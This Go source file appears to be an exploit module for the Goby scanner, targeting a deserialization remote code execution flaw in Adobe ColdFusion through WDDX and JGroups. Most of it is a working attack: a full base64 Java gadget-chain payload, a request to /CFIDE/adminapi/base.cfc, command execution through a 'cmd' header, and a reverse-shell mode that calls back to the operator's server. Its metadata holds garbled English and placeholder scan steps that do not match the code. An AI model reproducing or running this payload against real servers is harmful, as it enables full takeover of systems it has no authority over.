package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Adobe ColdFusion WDDX JGroups remote code execution vulnerability",
    "Description": "<p>Adobe Coldfusion is a commercial application server developed by Adobe for web applications.</p><p>The attacker can send unbelievable serialized data and trigger derivativeization to the Coldfusion server, thereby executing any code.</p>",
    "Product": "Adobe-ColdFusion",
    "Homepage": "https://www.adobe.com/",
    "DisclosureDate": "2023-07-13",
    "Author": "m0x0is3ry@foxmail.com",
    "FofaQuery": "body=\"/cfajax/\" || header=\"CFTOKEN\" || banner=\"CFTOKEN\" || body=\"ColdFusion.Ajax\" || body=\"<cfscript>\" || server=\"ColdFusion\" || title=\"ColdFusion\" || (body=\"crossdomain.xml\" && body=\"CFIDE\") || (body=\"#000808\" && body=\"#e7e7e7\")",
    "GobyQuery": "body=\"/cfajax/\" || header=\"CFTOKEN\" || banner=\"CFTOKEN\" || body=\"ColdFusion.Ajax\" || body=\"<cfscript>\" || server=\"ColdFusion\" || title=\"ColdFusion\" || (body=\"crossdomain.xml\" && body=\"CFIDE\") || (body=\"#000808\" && body=\"#e7e7e7\")",
    "Level": "3",
    "Impact": "<p>The attacker can execute the code at the server through this vulnerability, obtain the server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://helpx.adobe.com/security.html\">https://helpx.adobe.com/security.html</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Adobe ColdFusion WDDX JGroups 远程代码执行漏洞",
            "Product": "Adobe-ColdFusion",
            "Description": "<p>Adobe ColdFusion 是 Adobe 公司开发的用于 Web 应用程序开发的商业应用程序服务器。</p><p>攻击者可向 ColdFusion 服务器发送不受信任的序列化数据并触发反序列化，从而执行任意代码。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://helpx.adobe.com/security.html\">https://helpx.adobe.com/security.html</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Adobe ColdFusion WDDX JGroups remote code execution vulnerability",
            "Product": "Adobe-ColdFusion",
            "Description": "<p>Adobe Coldfusion is a commercial application server developed by Adobe for web applications.</p><p>The attacker can send unbelievable serialized data and trigger derivativeization to the Coldfusion server, thereby executing any code.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://helpx.adobe.com/security.html\">https://helpx.adobe.com/security.html</a></p>",
            "Impact": "<p>The attacker can execute the code at the server through this vulnerability, obtain the server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-07",
    "PocId": "10833"
}`

	sendPayloadFlag4NXB := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		payload := `<wddxPacket version='1.0'><struct type='xorg.jgroups.blocks.ReplicatedTreex'><var name='state'><binary>AqztAAVzcgAXamF2YS51dGlsLlByaW9yaXR5UXVldWWU2jC0+z+CsQMAAkkABHNpemVMAApjb21wYXJhdG9ydAAWTGphdmEvdXRpbC9Db21wYXJhdG9yO3hwAAAAAnNyACtvcmcuYXBhY2hlLmNvbW1vbnMuYmVhbnV0aWxzLkJlYW5Db21wYXJhdG9y46GI6nMipEgCAAJMAApjb21wYXJhdG9ycQB+AAFMAAhwcm9wZXJ0eXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5jb21wYXJhdG9ycy5Db21wYXJhYmxlQ29tcGFyYXRvcvv0mSW4brE3AgAAeHB0ABBvdXRwdXRQcm9wZXJ0aWVzdwQAAAADc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAETAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAXVyAAJbQqzzF/gGCFTgAgAAeHAAAB2Vyv66vgAAADQBogoAHQDTCgDUANUKANQA1goAHQDXCACaCgAbANgKANkA2goA2QDbBwCbCgDUANwIALIKACAA3QgA3ggA3wcA4AgA4QgA4gcA4woAGwDkCADlCACPBwDmCwAWAOcLABYA6AgAhQgA6QcA6goAGwDrBwDsCgDtAO4IAO8HAPAIAIcKAHcA8QoAIADyCADzCQAmAPQHAPUKACYA9ggA9woAdwD4CgAbAPkIAPoHAIoKABsA+wgA/AcA/QgA/ggA/woAGwEABwEBCgDUAQIKAQMA+AgBBAoAIAEFCAEGCgAgAQcIAQgKACABCQoAIAEKCAELCgAgAQwIAQ0KACYBDgoAdwEPCAEQCgB3AREIARIKARMBFAoAIAEVCAEWCAEXCAEYBwEZCgBKANMKAEoBGggBGwoASgEcCAEdCAEeCAEfCAEgCgEhASIKASEBIwcBJAoBJQEmCgBVAScIASgKAFUBKQoAVQEqCgBVASsKASUBLAoBJQEtCgAvARwIAS4KACABLwgBMAoBIQExBwEyCgAmATMKAGMBNAoAYwEmCgElATUKAGMBNQoAYwE2CgE3ATgKATcBOQoBOgE7CgE6ATwFAAAAAAAAADIKANQBPQoBJQE+CgBjAT8IAUAKAC8BQQgBQggBQwcBRAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAFlAQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBAANjbHMBABFMamF2YS9sYW5nL0NsYXNzOwEABHZhcjUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAlwcm9jZXNzb3IBABJMamF2YS9sYW5nL09iamVjdDsBAANyZXEBAARyZXNwAQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGcmVzdWx0AQACW0IBAAFqAQABSQEACnRocmVhZE5hbWUBAANvYmoBAApwcm9jZXNzb3JzAQAQTGphdmEvdXRpbC9MaXN0OwEABnRocmVhZAEAEkxqYXZhL2xhbmcvVGhyZWFkOwEAAWkBAAR0aGlzAQAETEE0OwEABWdyb3VwAQAXTGphdmEvbGFuZy9UaHJlYWRHcm91cDsBAAFmAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAB3RocmVhZHMBABNbTGphdmEvbGFuZy9UaHJlYWQ7AQANU3RhY2tNYXBUYWJsZQcBRAcBRQcBRgcBRwcA8AcA7AcA4wcA5gcA/QEACkV4Y2VwdGlvbnMBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAiTGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uOwEABG5hbWUHAQEBAAdleGVjdXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAhob3N0SW5mbwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAVwYXJhbQcArwEABGV4ZWMBAAFzAQATTGphdmEvdXRpbC9TY2FubmVyOwEABm91dHB1dAEAAm9zAQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAApleGVjdXRlQ21kBwFIBwEkBwEZBwFJAQAHcmV2ZXJzZQEAOShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL0ludGVnZXI7KUxqYXZhL2xhbmcvU3RyaW5nOwEACXNoZWxsUGF0aAEAAXABABFMamF2YS9uZXQvU29ja2V0OwEAAnBpAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQACcGUBAAJzaQEAAnBvAQAWTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEAAnNvAQACaXABAARwb3J0AQATTGphdmEvbGFuZy9JbnRlZ2VyOwcA9QcBMgcBSgcBSwEAClNvdXJjZUZpbGUBAAdBNC5qYXZhDAB4AHkHAUcMAUwBTQwBTgFPDAFQAVEMAVIBUwcBRgwBVAFVDAFWAVcMAVgBWQwBWgFbAQAEaHR0cAEABnRhcmdldAEAEmphdmEvbGFuZy9SdW5uYWJsZQEABnRoaXMkMAEAB2hhbmRsZXIBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MAVwBUQEABmdsb2JhbAEADmphdmEvdXRpbC9MaXN0DAFdAV4MAVYBXwEAC2dldFJlc3BvbnNlAQAPamF2YS9sYW5nL0NsYXNzDAFgAWEBABBqYXZhL2xhbmcvT2JqZWN0BwFiDAFjAWQBAAlnZXRIZWFkZXIBABBqYXZhL2xhbmcvU3RyaW5nDACsAK0MAWUBZgEACXNldFN0YXR1cwwBZwCAAQARamF2YS9sYW5nL0ludGVnZXIMAHgBaAEAJG9yZy5hcGFjaGUudG9tY2F0LnV0aWwuYnVmLkJ5dGVDaHVuawwApwCoDAFpAWoBAAhzZXRCeXRlcwwBawFhAQAHZG9Xcml0ZQEAE2phdmEvbGFuZy9FeGNlcHRpb24BABNqYXZhLm5pby5CeXRlQnVmZmVyAQAEd3JhcAwBbACoAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24MAW0BbgcBbwEAAAwBcAFxAQAQY29tbWFuZCBub3QgbnVsbAwBcgFZAQAFIyMjIyMMAXMBdAwBdQF2AQABOgwBdwF4AQAiY29tbWFuZCByZXZlcnNlIGhvc3QgZm9ybWF0IGVycm9yIQwBeQF6DAC+AL8BAAVAQEBAQAwAsgCtAQAHb3MubmFtZQcBewwBfACtDAF9AVkBAAN3aW4BAARwaW5nAQACLW4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBfgF/AQAFIC1uIDQMAYABWQEAAi9jAQAFIC10IDQBAAJzaAEAAi1jBwGBDAGCAYMMALIBhAEAEWphdmEvdXRpbC9TY2FubmVyBwFIDAGFAYYMAHgBhwEAAlxhDAGIAYkMAYoBiwwBjAFZDAGNAYYMAY4AeQEABy9iaW4vc2gMAHgBjwEAB2NtZC5leGUMALIBkAEAD2phdmEvbmV0L1NvY2tldAwBkQFeDAB4AZIMAZMBlAwBlQGLBwFKDAGWAV4MAZcBXgcBSwwBmAFoDAGZAHkMAZoBmwwBnAFeDAGdAHkBAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwBngFZAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEBAAJBNAEAFWphdmEvbGFuZy9UaHJlYWRHcm91cAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQAQamF2YS9sYW5nL1RocmVhZAEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9sYW5nL1Rocm93YWJsZQEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABRqYXZhL2lvL091dHB1dFN0cmVhbQEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAA1nZXRTdXBlcmNsYXNzAQAEc2l6ZQEAAygpSQEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRCeXRlcwEABCgpW0IBAARUWVBFAQAEKEkpVgEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXREZWNsYXJlZE1ldGhvZAEAB2Zvck5hbWUBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAEdHJpbQEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEAB3ZhbHVlT2YBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvSW50ZWdlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9p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</binary></var></struct></wddxPacket>`
		cfg := httpclient.NewPostRequestConfig("/CFIDE/adminapi/base.cfc?method")
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		if cmd != "" {
			cfg.Header.Store("cmd", cmd)
		}
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Data = "argumentCollection=" + url.QueryEscape(payload)
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			rsp, err := sendPayloadFlag4NXB(u, "echo "+checkStr)
			if err != nil {
				return false
			}
			return strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, "echo "+checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			cmd := goutils.B2S(ss.Params["cmd"])
			waitSessionCh := make(chan string)
			if attackType == "reverse" {
				// 读取反弹端口
				rp, err := godclient.WaitSession("reverse", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				cmd = "#####" + godclient.GetGodServerHost() + ":" + rp
			}
			rsp, err := sendPayloadFlag4NXB(expResult.HostInfo, cmd)
			if err != nil && attackType != "reverse" {
				expResult.Success = false
				expResult.Output = err.Error()
			}
			output := "漏洞利用失败"
			expResult.Success = false
			if attackType == "reverse" {
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					output = "漏洞利用失败"
				}
			} else if attackType == "cmd" && strings.Contains(rsp.Utf8Html, "<!-- \" --->") {
				expResult.Success = true
				output = rsp.Utf8Html[:strings.Index(rsp.Utf8Html, "<!-- \" --->")]
			}
			expResult.Output = output
			return expResult
		},
	))
}
